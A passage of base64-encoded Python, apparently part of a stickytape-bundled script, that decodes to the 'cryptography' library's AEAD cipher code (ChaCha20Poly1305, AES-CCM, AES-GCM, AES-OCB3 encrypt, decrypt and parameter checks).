clxuICAgIGJhY2tlbmQub3BlbnNzbF9hc3NlcnQocmVzICE9IDApXHJcbiAgICB0YWcgPSBiYWNrZW5kLl9mZmkuYnVmZmVyKHRhZ19idWYpWzpdXHJcblxyXG4gICAgaWYgaXNpbnN0YW5jZShjaXBoZXIsIEFFU1NJVik6XHJcbiAgICAgICAgIyBSRkMgNTI5NyBkZWZpbmVzIHRoZSBvdXRwdXQgYXMgSVYgfHwgQywgd2hlcmUgdGhlIHRhZyB3ZSBnZW5lcmF0ZSBpc1xyXG4gICAgICAgICMgdGhlICJJViIgYW5kIEMgaXMgdGhlIGNpcGhlcnRleHQuIFRoaXMgaXMgdGhlIG9wcG9zaXRlIG9mIG91clxyXG4gICAgICAgICMgb3RoZXIgQUVBRHMsIHdoaWNoIGFyZSBDaXBoZXJ0ZXh0IHx8IFRhZ1xyXG4gICAgICAgIGJhY2tlbmQub3BlbnNzbF9hc3NlcnQobGVuKHRhZykgPT0gMTYpXHJcbiAgICAgICAgcmV0dXJuIHRhZyArIHByb2Nlc3NlZF9kYXRhXHJcbiAgICBlbHNlOlxyXG4gICAgICAgIHJldHVybiBwcm9jZXNzZWRfZGF0YSArIHRhZ1xyXG5cclxuXHJcbmRlZiBfZGVjcnlwdChcclxuICAgIGJhY2tlbmQ6ICJCYWNrZW5kIixcclxuICAgIGNpcGhlcjogIl9BRUFEX1RZUEVTIixcclxuICAgIG5vbmNlOiBieXRlcyxcclxuICAgIGRhdGE6IGJ5dGVzLFxyXG4gICAgYXNzb2NpYXRlZF9kYXRhOiB0eXBpbmcuTGlzdFtieXRlc10sXHJcbiAgICB0YWdfbGVuZ3RoOiBpbnQsXHJcbikgLT4gYnl0ZXM6XHJcbiAgICBmcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQucHJpbWl0aXZlcy5jaXBoZXJzLmFlYWQgaW1wb3J0IEFFU0NDTSwgQUVTU0lWXHJcblxyXG4gICAgaWYgbGVuKGRhdGEpIDwgdGFnX2xlbmd0aDpcclxuICAgICAgICByYWlzZSBJbnZhbGlkVGFnXHJcblxyXG4gICAgaWYgaXNpbnN0YW5jZShjaXBoZXIsIEFFU1NJVik6XHJcbiAgICAgICAgIyBSRkMgNTI5NyBkZWZpbmVzIHRoZSBvdXRwdXQgYXMgSVYgfHwgQywgd2hlcmUgdGhlIHRhZyB3ZSBnZW5lcmF0ZSBpc1xyXG4gICAgICAgICMgdGhlICJJViIgYW5kIEMgaXMgdGhlIGNpcGhlcnRleHQuIFRoaXMgaXMgdGhlIG9wcG9zaXRlIG9mIG91clxyXG4gICAgICAgICMgb3RoZXIgQUVBRHMsIHdoaWNoIGFyZSBDaXBoZXJ0ZXh0IHx8IFRhZ1xyXG4gICAgICAgIHRhZyA9IGRhdGFbOnRhZ19sZW5ndGhdXHJcbiAgICAgICAgZGF0YSA9IGRhdGFbdGFnX2xlbmd0aDpdXHJcbiAgICBlbHNlOlxyXG4gICAgICAgIHRhZyA9IGRhdGFbLXRhZ19sZW5ndGg6XVxyXG4gICAgICAgIGRhdGEgPSBkYXRhWzotdGFnX2xlbmd0aF1cclxuICAgIGNpcGhlcl9uYW1lID0gX2FlYWRfY2lwaGVyX25hbWUoY2lwaGVyKVxyXG4gICAgY3R4ID0gX2FlYWRfc2V0dXAoXHJcbiAgICAgICAgYmFja2VuZCwgY2lwaGVyX25hbWUsIGNpcGhlci5fa2V5LCBub25jZSwgdGFnLCB0YWdfbGVuZ3RoLCBfREVDUllQVFxyXG4gICAgKVxyXG4gICAgIyBDQ00gcmVxdWlyZXMgdXMgdG8gcGFzcyB0aGUgbGVuZ3RoIG9mIHRoZSBkYXRhIGJlZm9yZSBwcm9jZXNzaW5nIGFueXRoaW5nXHJcbiAgICAjIEhvd2V2ZXIgY2FsbGluZyB0aGlzIHdpdGggYW55IG90aGVyIEFFQUQgcmVzdWx0cyBpbiBhbiBlcnJvclxyXG4gICAgaWYgaXNpbnN0YW5jZShjaXBoZXIsIEFFU0NDTSk6XHJcbiAgICAgICAgX3NldF9sZW5ndGgoYmFja2VuZCwgY3R4LCBsZW4oZGF0YSkpXHJcblxyXG4gICAgZm9yIGFkIGluIGFzc29jaWF0ZWRfZGF0YTpcclxuICAgICAgICBfcHJvY2Vzc19hYWQoYmFja2VuZCwgY3R4LCBhZClcclxuICAgICMgQ0NNIGhhcyBhIGRpZmZlcmVudCBlcnJvciBwYXRoIGlmIHRoZSB0YWcgZG9lc25cJ3QgbWF0Y2guIEVycm9ycyBhcmVcclxuICAgICMgcmFpc2VkIGluIFVwZGF0ZSBhbmQgRmluYWwgaXMgaXJyZWxldmFudC5cclxuICAgIGlmIGlzaW5zdGFuY2UoY2lwaGVyLCBBRVNDQ00pOlxyXG4gICAgICAgIG91dGxlbiA9IGJhY2tlbmQuX2ZmaS5uZXcoImludCAqIilcclxuICAgICAgICBidWYgPSBiYWNrZW5kLl9mZmkubmV3KCJ1bnNpZ25lZCBjaGFyW10iLCBsZW4oZGF0YSkpXHJcbiAgICAgICAgcmVzID0gYmFja2VuZC5fbGliLkVWUF9DaXBoZXJVcGRhdGUoY3R4LCBidWYsIG91dGxlbiwgZGF0YSwgbGVuKGRhdGEpKVxyXG4gICAgICAgIGlmIHJlcyAhPSAxOlxyXG4gICAgICAgICAgICBiYWNrZW5kLl9jb25zdW1lX2Vycm9ycygpXHJcbiAgICAgICAgICAgIHJhaXNlIEludmFsaWRUYWdcclxuXHJcbiAgICAgICAgcHJvY2Vzc2VkX2RhdGEgPSBiYWNrZW5kLl9mZmkuYnVmZmVyKGJ1Ziwgb3V0bGVuWzBdKVs6XVxyXG4gICAgZWxzZTpcclxuICAgICAgICBwcm9jZXNzZWRfZGF0YSA9IF9wcm9jZXNzX2RhdGEoYmFja2VuZCwgY3R4LCBkYXRhKVxyXG4gICAgICAgIG91dGxlbiA9IGJhY2tlbmQuX2ZmaS5uZXcoImludCAqIilcclxuICAgICAgICAjIE9DQiBjYW4gcmV0dXJuIHVwIHRvIDE1IGJ5dGVzICgxNiBieXRlIGJsb2NrIC0gMSkgaW4gZmluYWxpemF0aW9uXHJcbiAgICAgICAgYnVmID0gYmFja2VuZC5fZmZpLm5ldygidW5zaWduZWQgY2hhcltdIiwgMTYpXHJcbiAgICAgICAgcmVzID0gYmFja2VuZC5fbGliLkVWUF9DaXBoZXJGaW5hbF9leChjdHgsIGJ1Ziwgb3V0bGVuKVxyXG4gICAgICAgIHByb2Nlc3NlZF9kYXRhICs9IGJhY2tlbmQuX2ZmaS5idWZmZXIoYnVmLCBvdXRsZW5bMF0pWzpdXHJcbiAgICAgICAgaWYgcmVzID09IDA6XHJcbiAgICAgICAgICAgIGJhY2tlbmQuX2NvbnN1bWVfZXJyb3JzKClcclxuICAgICAgICAgICAgcmFpc2UgSW52YWxpZFRhZ1xyXG5cclxuICAgIHJldHVybiBwcm9jZXNzZWRfZGF0YVxyXG4nKQogICAgX19zdGlja3l0YXBlX3dyaXRlX21vZHVsZSgnY3J5cHRvZ3JhcGh5L2hhem1hdC9wcmltaXRpdmVzL2NpcGhlcnMvYWVhZC5weScsIGInIyBUaGlzIGZpbGUgaXMgZHVhbCBsaWNlbnNlZCB1bmRlciB0aGUgdGVybXMgb2YgdGhlIEFwYWNoZSBMaWNlbnNlLCBWZXJzaW9uXHJcbiMgMi4wLCBhbmQgdGhlIEJTRCBMaWNlbnNlLiBTZWUgdGhlIExJQ0VOU0UgZmlsZSBpbiB0aGUgcm9vdCBvZiB0aGlzIHJlcG9zaXRvcnlcclxuIyBmb3IgY29tcGxldGUgZGV0YWlscy5cclxuXHJcblxyXG5pbXBvcnQgb3NcclxuaW1wb3J0IHR5cGluZ1xyXG5cclxuZnJvbSBjcnlwdG9ncmFwaHkgaW1wb3J0IGV4Y2VwdGlvbnMsIHV0aWxzXHJcbmZyb20gY3J5cHRvZ3JhcGh5Lmhhem1hdC5iYWNrZW5kcy5vcGVuc3NsIGltcG9ydCBhZWFkXHJcbmZyb20gY3J5cHRvZ3JhcGh5Lmhhem1hdC5iYWNrZW5kcy5vcGVuc3NsLmJhY2tlbmQgaW1wb3J0IGJhY2tlbmRcclxuXHJcblxyXG5jbGFzcyBDaGFDaGEyMFBvbHkxMzA1OlxyXG4gICAgX01BWF9TSVpFID0gMioqMzEgLSAxXHJcblxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIGtleTogYnl0ZXMpOlxyXG4gICAgICAgIGlmIG5vdCBiYWNrZW5kLmFlYWRfY2lwaGVyX3N1cHBvcnRlZChzZWxmKTpcclxuICAgICAgICAgICAgcmFpc2UgZXhjZXB0aW9ucy5VbnN1cHBvcnRlZEFsZ29yaXRobShcclxuICAgICAgICAgICAgICAgICJDaGFDaGEyMFBvbHkxMzA1IGlzIG5vdCBzdXBwb3J0ZWQgYnkgdGhpcyB2ZXJzaW9uIG9mIE9wZW5TU0wiLFxyXG4gICAgICAgICAgICAgICAgZXhjZXB0aW9ucy5fUmVhc29ucy5VTlNVUFBPUlRFRF9DSVBIRVIsXHJcbiAgICAgICAgICAgIClcclxuICAgICAgICB1dGlscy5fY2hlY2tfYnl0ZXNsaWtlKCJrZXkiLCBrZXkpXHJcblxyXG4gICAgICAgIGlmIGxlbihrZXkpICE9IDMyOlxyXG4gICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJDaGFDaGEyMFBvbHkxMzA1IGtleSBtdXN0IGJlIDMyIGJ5dGVzLiIpXHJcblxyXG4gICAgICAgIHNlbGYuX2tleSA9IGtleVxyXG5cclxuICAgIEBjbGFzc21ldGhvZFxyXG4gICAgZGVmIGdlbmVyYXRlX2tleShjbHMpIC0+IGJ5dGVzOlxyXG4gICAgICAgIHJldHVybiBvcy51cmFuZG9tKDMyKVxyXG5cclxuICAgIGRlZiBlbmNyeXB0KFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICAgICAgbm9uY2U6IGJ5dGVzLFxyXG4gICAgICAgIGRhdGE6IGJ5dGVzLFxyXG4gICAgICAgIGFzc29jaWF0ZWRfZGF0YTogdHlwaW5nLk9wdGlvbmFsW2J5dGVzXSxcclxuICAgICkgLT4gYnl0ZXM6XHJcbiAgICAgICAgaWYgYXNzb2NpYXRlZF9kYXRhIGlzIE5vbmU6XHJcbiAgICAgICAgICAgIGFzc29jaWF0ZWRfZGF0YSA9IGIiIlxyXG5cclxuICAgICAgICBpZiBsZW4oZGF0YSkgPiBzZWxmLl9NQVhfU0laRSBvciBsZW4oYXNzb2NpYXRlZF9kYXRhKSA+IHNlbGYuX01BWF9TSVpFOlxyXG4gICAgICAgICAgICAjIFRoaXMgaXMgT3ZlcmZsb3dFcnJvciB0byBtYXRjaCB3aGF0IGNmZmkgd291bGQgcmFpc2VcclxuICAgICAgICAgICAgcmFpc2UgT3ZlcmZsb3dFcnJvcihcclxuICAgICAgICAgICAgICAgICJEYXRhIG9yIGFzc29jaWF0ZWQgZGF0YSB0b28gbG9uZy4gTWF4IDIqKjMxIC0gMSBieXRlcyJcclxuICAgICAgICAgICAgKVxyXG5cclxuICAgICAgICBzZWxmLl9jaGVja19wYXJhbXMobm9uY2UsIGRhdGEsIGFzc29jaWF0ZWRfZGF0YSlcclxuICAgICAgICByZXR1cm4gYWVhZC5fZW5jcnlwdChiYWNrZW5kLCBzZWxmLCBub25jZSwgZGF0YSwgW2Fzc29jaWF0ZWRfZGF0YV0sIDE2KVxyXG5cclxuICAgIGRlZiBkZWNyeXB0KFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICAgICAgbm9uY2U6IGJ5dGVzLFxyXG4gICAgICAgIGRhdGE6IGJ5dGVzLFxyXG4gICAgICAgIGFzc29jaWF0ZWRfZGF0YTogdHlwaW5nLk9wdGlvbmFsW2J5dGVzXSxcclxuICAgICkgLT4gYnl0ZXM6XHJcbiAgICAgICAgaWYgYXNzb2NpYXRlZF9kYXRhIGlzIE5vbmU6XHJcbiAgICAgICAgICAgIGFzc29jaWF0ZWRfZGF0YSA9IGIiIlxyXG5cclxuICAgICAgICBzZWxmLl9jaGVja19wYXJhbXMobm9uY2UsIGRhdGEsIGFzc29jaWF0ZWRfZGF0YSlcclxuICAgICAgICByZXR1cm4gYWVhZC5fZGVjcnlwdChiYWNrZW5kLCBzZWxmLCBub25jZSwgZGF0YSwgW2Fzc29jaWF0ZWRfZGF0YV0sIDE2KVxyXG5cclxuICAgIGRlZiBfY2hlY2tfcGFyYW1zKFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICAgICAgbm9uY2U6IGJ5dGVzLFxyXG4gICAgICAgIGRhdGE6IGJ5dGVzLFxyXG4gICAgICAgIGFzc29jaWF0ZWRfZGF0YTogYnl0ZXMsXHJcbiAgICApIC0+IE5vbmU6XHJcbiAgICAgICAgdXRpbHMuX2NoZWNrX2J5dGVzbGlrZSgibm9uY2UiLCBub25jZSlcclxuICAgICAgICB1dGlscy5fY2hlY2tfYnl0ZXMoImRhdGEiLCBkYXRhKVxyXG4gICAgICAgIHV0aWxzLl9jaGVja19ieXRlcygiYXNzb2NpYXRlZF9kYXRhIiwgYXNzb2NpYXRlZF9kYXRhKVxyXG4gICAgICAgIGlmIGxlbihub25jZSkgIT0gMTI6XHJcbiAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoIk5vbmNlIG11c3QgYmUgMTIgYnl0ZXMiKVxyXG5cclxuXHJcbmNsYXNzIEFFU0NDTTpcclxuICAgIF9NQVhfU0laRSA9IDIqKjMxIC0gMVxyXG5cclxuICAgIGRlZiBfX2luaXRfXyhzZWxmLCBrZXk6IGJ5dGVzLCB0YWdfbGVuZ3RoOiBpbnQgPSAxNik6XHJcbiAgICAgICAgdXRpbHMuX2NoZWNrX2J5dGVzbGlrZSgia2V5Iiwga2V5KVxyXG4gICAgICAgIGlmIGxlbihrZXkpIG5vdCBpbiAoMTYsIDI0LCAzMik6XHJcbiAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoIkFFU0NDTSBrZXkgbXVzdCBiZSAxMjgsIDE5Miwgb3IgMjU2IGJpdHMuIilcclxuXHJcbiAgICAgICAgc2VsZi5fa2V5ID0ga2V5XHJcbiAgICAgICAgaWYgbm90IGlzaW5zdGFuY2UodGFnX2xlbmd0aCwgaW50KTpcclxuICAgICAgICAgICAgcmFpc2UgVHlwZUVycm9yKCJ0YWdfbGVuZ3RoIG11c3QgYmUgYW4gaW50ZWdlciIpXHJcblxyXG4gICAgICAgIGlmIHRhZ19sZW5ndGggbm90IGluICg0LCA2LCA4LCAxMCwgMTIsIDE0LCAxNik6XHJcbiAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoIkludmFsaWQgdGFnX2xlbmd0aCIpXHJcblxyXG4gICAgICAgIHNlbGYuX3RhZ19sZW5ndGggPSB0YWdfbGVuZ3RoXHJcblxyXG4gICAgICAgIGlmIG5vdCBiYWNrZW5kLmFlYWRfY2lwaGVyX3N1cHBvcnRlZChzZWxmKTpcclxuICAgICAgICAgICAgcmFpc2UgZXhjZXB0aW9ucy5VbnN1cHBvcnRlZEFsZ29yaXRobShcclxuICAgICAgICAgICAgICAgICJBRVNDQ00gaXMgbm90IHN1cHBvcnRlZCBieSB0aGlzIHZlcnNpb24gb2YgT3BlblNTTCIsXHJcbiAgICAgICAgICAgICAgICBleGNlcHRpb25zLl9SZWFzb25zLlVOU1VQUE9SVEVEX0NJUEhFUixcclxuICAgICAgICAgICAgKVxyXG5cclxuICAgIEBjbGFzc21ldGhvZFxyXG4gICAgZGVmIGdlbmVyYXRlX2tleShjbHMsIGJpdF9sZW5ndGg6IGludCkgLT4gYnl0ZXM6XHJcbiAgICAgICAgaWYgbm90IGlzaW5zdGFuY2UoYml0X2xlbmd0aCwgaW50KTpcclxuICAgICAgICAgICAgcmFpc2UgVHlwZUVycm9yKCJiaXRfbGVuZ3RoIG11c3QgYmUgYW4gaW50ZWdlciIpXHJcblxyXG4gICAgICAgIGlmIGJpdF9sZW5ndGggbm90IGluICgxMjgsIDE5MiwgMjU2KTpcclxuICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcigiYml0X2xlbmd0aCBtdXN0IGJlIDEyOCwgMTkyLCBvciAyNTYiKVxyXG5cclxuICAgICAgICByZXR1cm4gb3MudXJhbmRvbShiaXRfbGVuZ3RoIC8vIDgpXHJcblxyXG4gICAgZGVmIGVuY3J5cHQoXHJcbiAgICAgICAgc2VsZixcclxuICAgICAgICBub25jZTogYnl0ZXMsXHJcbiAgICAgICAgZGF0YTogYnl0ZXMsXHJcbiAgICAgICAgYXNzb2NpYXRlZF9kYXRhOiB0eXBpbmcuT3B0aW9uYWxbYnl0ZXNdLFxyXG4gICAgKSAtPiBieXRlczpcclxuICAgICAgICBpZiBhc3NvY2lhdGVkX2RhdGEgaXMgTm9uZTpcclxuICAgICAgICAgICAgYXNzb2NpYXRlZF9kYXRhID0gYiIiXHJcblxyXG4gICAgICAgIGlmIGxlbihkYXRhKSA+IHNlbGYuX01BWF9TSVpFIG9yIGxlbihhc3NvY2lhdGVkX2RhdGEpID4gc2VsZi5fTUFYX1NJWkU6XHJcbiAgICAgICAgICAgICMgVGhpcyBpcyBPdmVyZmxvd0Vycm9yIHRvIG1hdGNoIHdoYXQgY2ZmaSB3b3VsZCByYWlzZVxyXG4gICAgICAgICAgICByYWlzZSBPdmVyZmxvd0Vycm9yKFxyXG4gICAgICAgICAgICAgICAgIkRhdGEgb3IgYXNzb2NpYXRlZCBkYXRhIHRvbyBsb25nLiBNYXggMioqMzEgLSAxIGJ5dGVzIlxyXG4gICAgICAgICAgICApXHJcblxyXG4gICAgICAgIHNlbGYuX2NoZWNrX3BhcmFtcyhub25jZSwgZGF0YSwgYXNzb2NpYXRlZF9kYXRhKVxyXG4gICAgICAgIHNlbGYuX3ZhbGlkYXRlX2xlbmd0aHMobm9uY2UsIGxlbihkYXRhKSlcclxuICAgICAgICByZXR1cm4gYWVhZC5fZW5jcnlwdChcclxuICAgICAgICAgICAgYmFja2VuZCwgc2VsZiwgbm9uY2UsIGRhdGEsIFthc3NvY2lhdGVkX2RhdGFdLCBzZWxmLl90YWdfbGVuZ3RoXHJcbiAgICAgICAgKVxyXG5cclxuICAgIGRlZiBkZWNyeXB0KFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICAgICAgbm9uY2U6IGJ5dGVzLFxyXG4gICAgICAgIGRhdGE6IGJ5dGVzLFxyXG4gICAgICAgIGFzc29jaWF0ZWRfZGF0YTogdHlwaW5nLk9wdGlvbmFsW2J5dGVzXSxcclxuICAgICkgLT4gYnl0ZXM6XHJcbiAgICAgICAgaWYgYXNzb2NpYXRlZF9kYXRhIGlzIE5vbmU6XHJcbiAgICAgICAgICAgIGFzc29jaWF0ZWRfZGF0YSA9IGIiIlxyXG5cclxuICAgICAgICBzZWxmLl9jaGVja19wYXJhbXMobm9uY2UsIGRhdGEsIGFzc29jaWF0ZWRfZGF0YSlcclxuICAgICAgICByZXR1cm4gYWVhZC5fZGVjcnlwdChcclxuICAgICAgICAgICAgYmFja2VuZCwgc2VsZiwgbm9uY2UsIGRhdGEsIFthc3NvY2lhdGVkX2RhdGFdLCBzZWxmLl90YWdfbGVuZ3RoXHJcbiAgICAgICAgKVxyXG5cclxuICAgIGRlZiBfdmFsaWRhdGVfbGVuZ3RocyhzZWxmLCBub25jZTogYnl0ZXMsIGRhdGFfbGVuOiBpbnQpIC0+IE5vbmU6XHJcbiAgICAgICAgIyBGb3IgaW5mb3JtYXRpb24gYWJvdXQgY29tcHV0aW5nIHRoaXMsIHNlZVxyXG4gICAgICAgICMgaHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzM2MTAjc2VjdGlvbi0yLjFcclxuICAgICAgICBsX3ZhbCA9IDE1IC0gbGVuKG5vbmNlKVxyXG4gICAgICAgIGlmIDIgKiogKDggKiBsX3ZhbCkgPCBkYXRhX2xlbjpcclxuICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcigiRGF0YSB0b28gbG9uZyBmb3Igbm9uY2UiKVxyXG5cclxuICAgIGRlZiBfY2hlY2tfcGFyYW1zKFxyXG4gICAgICAgIHNlbGYsIG5vbmNlOiBieXRlcywgZGF0YTogYnl0ZXMsIGFzc29jaWF0ZWRfZGF0YTogYnl0ZXNcclxuICAgICkgLT4gTm9uZTpcclxuICAgICAgICB1dGlscy5fY2hlY2tfYnl0ZXNsaWtlKCJub25jZSIsIG5vbmNlKVxyXG4gICAgICAgIHV0aWxzLl9jaGVja19ieXRlcygiZGF0YSIsIGRhdGEpXHJcbiAgICAgICAgdXRpbHMuX2NoZWNrX2J5dGVzKCJhc3NvY2lhdGVkX2RhdGEiLCBhc3NvY2lhdGVkX2RhdGEpXHJcbiAgICAgICAgaWYgbm90IDcgPD0gbGVuKG5vbmNlKSA8PSAxMzpcclxuICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcigiTm9uY2UgbXVzdCBiZSBiZXR3ZWVuIDcgYW5kIDEzIGJ5dGVzIilcclxuXHJcblxyXG5jbGFzcyBBRVNHQ006XHJcbiAgICBfTUFYX1NJWkUgPSAyKiozMSAtIDFcclxuXHJcbiAgICBkZWYgX19pbml0X18oc2VsZiwga2V5OiBieXRlcyk6XHJcbiAgICAgICAgdXRpbHMuX2NoZWNrX2J5dGVzbGlrZSgia2V5Iiwga2V5KVxyXG4gICAgICAgIGlmIGxlbihrZXkpIG5vdCBpbiAoMTYsIDI0LCAzMik6XHJcbiAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoIkFFU0dDTSBrZXkgbXVzdCBiZSAxMjgsIDE5Miwgb3IgMjU2IGJpdHMuIilcclxuXHJcbiAgICAgICAgc2VsZi5fa2V5ID0ga2V5XHJcblxyXG4gICAgQGNsYXNzbWV0aG9kXHJcbiAgICBkZWYgZ2VuZXJhdGVfa2V5KGNscywgYml0X2xlbmd0aDogaW50KSAtPiBieXRlczpcclxuICAgICAgICBpZiBub3QgaXNpbnN0YW5jZShiaXRfbGVuZ3RoLCBpbnQpOlxyXG4gICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoImJpdF9sZW5ndGggbXVzdCBiZSBhbiBpbnRlZ2VyIilcclxuXHJcbiAgICAgICAgaWYgYml0X2xlbmd0aCBub3QgaW4gKDEyOCwgMTkyLCAyNTYpOlxyXG4gICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJiaXRfbGVuZ3RoIG11c3QgYmUgMTI4LCAxOTIsIG9yIDI1NiIpXHJcblxyXG4gICAgICAgIHJldHVybiBvcy51cmFuZG9tKGJpdF9sZW5ndGggLy8gOClcclxuXHJcbiAgICBkZWYgZW5jcnlwdChcclxuICAgICAgICBzZWxmLFxyXG4gICAgICAgIG5vbmNlOiBieXRlcyxcclxuICAgICAgICBkYXRhOiBieXRlcyxcclxuICAgICAgICBhc3NvY2lhdGVkX2RhdGE6IHR5cGluZy5PcHRpb25hbFtieXRlc10sXHJcbiAgICApIC0+IGJ5dGVzOlxyXG4gICAgICAgIGlmIGFzc29jaWF0ZWRfZGF0YSBpcyBOb25lOlxyXG4gICAgICAgICAgICBhc3NvY2lhdGVkX2RhdGEgPSBiIiJcclxuXHJcbiAgICAgICAgaWYgbGVuKGRhdGEpID4gc2VsZi5fTUFYX1NJWkUgb3IgbGVuKGFzc29jaWF0ZWRfZGF0YSkgPiBzZWxmLl9NQVhfU0laRTpcclxuICAgICAgICAgICAgIyBUaGlzIGlzIE92ZXJmbG93RXJyb3IgdG8gbWF0Y2ggd2hhdCBjZmZpIHdvdWxkIHJhaXNlXHJcbiAgICAgICAgICAgIHJhaXNlIE92ZXJmbG93RXJyb3IoXHJcbiAgICAgICAgICAgICAgICAiRGF0YSBvciBhc3NvY2lhdGVkIGRhdGEgdG9vIGxvbmcuIE1heCAyKiozMSAtIDEgYnl0ZXMiXHJcbiAgICAgICAgICAgIClcclxuXHJcbiAgICAgICAgc2VsZi5fY2hlY2tfcGFyYW1zKG5vbmNlLCBkYXRhLCBhc3NvY2lhdGVkX2RhdGEpXHJcbiAgICAgICAgcmV0dXJuIGFlYWQuX2VuY3J5cHQoYmFja2VuZCwgc2VsZiwgbm9uY2UsIGRhdGEsIFthc3NvY2lhdGVkX2RhdGFdLCAxNilcclxuXHJcbiAgICBkZWYgZGVjcnlwdChcclxuICAgICAgICBzZWxmLFxyXG4gICAgICAgIG5vbmNlOiBieXRlcyxcclxuICAgICAgICBkYXRhOiBieXRlcyxcclxuICAgICAgICBhc3NvY2lhdGVkX2RhdGE6IHR5cGluZy5PcHRpb25hbFtieXRlc10sXHJcbiAgICApIC0+IGJ5dGVzOlxyXG4gICAgICAgIGlmIGFzc29jaWF0ZWRfZGF0YSBpcyBOb25lOlxyXG4gICAgICAgICAgICBhc3NvY2lhdGVkX2RhdGEgPSBiIiJcclxuXHJcbiAgICAgICAgc2VsZi5fY2hlY2tfcGFyYW1zKG5vbmNlLCBkYXRhLCBhc3NvY2lhdGVkX2RhdGEpXHJcbiAgICAgICAgcmV0dXJuIGFlYWQuX2RlY3J5cHQoYmFja2VuZCwgc2VsZiwgbm9uY2UsIGRhdGEsIFthc3NvY2lhdGVkX2RhdGFdLCAxNilcclxuXHJcbiAgICBkZWYgX2NoZWNrX3BhcmFtcyhcclxuICAgICAgICBzZWxmLFxyXG4gICAgICAgIG5vbmNlOiBieXRlcyxcclxuICAgICAgICBkYXRhOiBieXRlcyxcclxuICAgICAgICBhc3NvY2lhdGVkX2RhdGE6IGJ5dGVzLFxyXG4gICAgKSAtPiBOb25lOlxyXG4gICAgICAgIHV0aWxzLl9jaGVja19ieXRlc2xpa2UoIm5vbmNlIiwgbm9uY2UpXHJcbiAgICAgICAgdXRpbHMuX2NoZWNrX2J5dGVzKCJkYXRhIiwgZGF0YSlcclxuICAgICAgICB1dGlscy5fY2hlY2tfYnl0ZXMoImFzc29jaWF0ZWRfZGF0YSIsIGFzc29jaWF0ZWRfZGF0YSlcclxuICAgICAgICBpZiBsZW4obm9uY2UpIDwgOCBvciBsZW4obm9uY2UpID4gMTI4OlxyXG4gICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJOb25jZSBtdXN0IGJlIGJldHdlZW4gOCBhbmQgMTI4IGJ5dGVzIilcclxuXHJcblxyXG5jbGFzcyBBRVNPQ0IzOlxyXG4gICAgX01BWF9TSVpFID0gMioqMzEgLSAxXHJcblxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIGtleTogYnl0ZXMpOlxyXG4gICAgICAgIHV0aWxzLl9jaGVja19ieXRlc2xpa2UoImtleSIsIGtleSlcclxuICAgICAgICBpZiBsZW4oa2V5KSBub3QgaW4gKDE2LCAyNCwgMzIpOlxyXG4gICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJBRVNPQ0IzIGtleSBtdXN0IGJlIDEyOCwgMTkyLCBvciAyNTYgYml0cy4iKVxyXG5cclxuICAgICAgICBzZWxmLl9rZXkgPSBrZXlcclxuXHJcbiAgICAgICAgaWYgbm90IGJhY2tlbmQuYWVhZF9jaXBoZXJfc3VwcG9ydGVkKHNlbGYpOlxyXG4gICAgICAgICAgICByYWlzZSBleGNlcHRpb25zLlVuc3VwcG9ydGVkQWxnb3JpdGhtKFxyXG4gICAgICAgICAgICAgICAgIk9DQjMgaXMgbm90IHN1cHBvcnRlZCBieSB0aGlzIHZlcnNpb24gb2YgT3BlblNTTCIsXHJcbiAgICAgICAgICAgICAgICBleGNlcHRpb25zLl9SZWFzb25zLlVOU1VQUE9SVEVEX0NJUEhFUixcclxuICAgICAgICAgICAgKVxyXG5cclxuICAgIEBjbGFzc21ldGhvZFxyXG4gICAgZGVmIGdlbmVyYXRlX2tleShjbHMsIGJpdF9sZW5ndGg6IGludCkgLT4gYnl0ZXM6XHJcbiAgICAgICAgaWYgbm90IGlzaW5zdGFuY2UoYml0X2xlbmd0aCwgaW50KTpcclxuICAgICAgICAgICAgcmFpc2UgVHlwZUVycm9yKCJiaXRfbGVuZ3RoIG11c3QgYmUgYW4gaW50ZWdlciIpXHJcblxyXG4gICAgICAgIGlmIGJpdF9sZW5ndGggbm90IGluICgxMjgsIDE5MiwgMjU2KTpcclxuICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcigiYml0X2xlbmd0aCBtdXN0IGJlIDEyOCwgMTkyLCBvciAyNTYiKVxyXG5cclxuICAgICAgICByZXR1cm4gb3MudXJhbmRvbShiaXRfbGVuZ3RoIC8vIDgpXHJcblxyXG4gICAgZGVmIGVuY3J5cHQoXHJcbiAgICAgICAgc2VsZixcclxuICAgICAgICBub25jZTogYnl0ZXMsXHJcbiAgICAgICAgZGF0YTogYnl0ZXMsXHJcbiAgICAgICAgYXNzb2NpYXRlZF9kYXRhOiB0eXBpbmcuT3B0aW9uYWxbYnl0ZXNdLFxyXG4gICAgKSAtPiBieXRlczpcclxuICAgICAgICBpZiBhc3NvY2lhdGVkX2RhdGEgaXMgTm9uZTpcclxuICAgICAgICAgICAgYXNzb2NpYXRlZF9kYXRhID0gYiIiXHJcblxyXG4gICAgICAgIGlmIGxlbihkYXRhKSA+IHNlbGYuX01BWF9TSVpFIG9yIGxlbihhc3NvY2lhdGVkX2RhdGEpID4gc2VsZi5fTUFYX1NJWkU6XHJcbiAgICAgICAgICAgICMgVGhpcyBpcyBPdmVyZmxvd0Vycm9yIHRvIG1hdGNoIHdoYXQgY2ZmaSB3b3VsZCByYWlzZVxyXG4gICAgICAgICAgICByYWlzZSBPdmVyZmxvd0Vycm9yKFxyXG4gICAgICAgICAgICAgICAgIkRhdGEgb3IgYXNzb2NpYXRlZCBkYXRhIHRvbyBsb25nLiBNYXggMioqMzEgLSAxIGJ5dGVzIlxyXG4gICAgI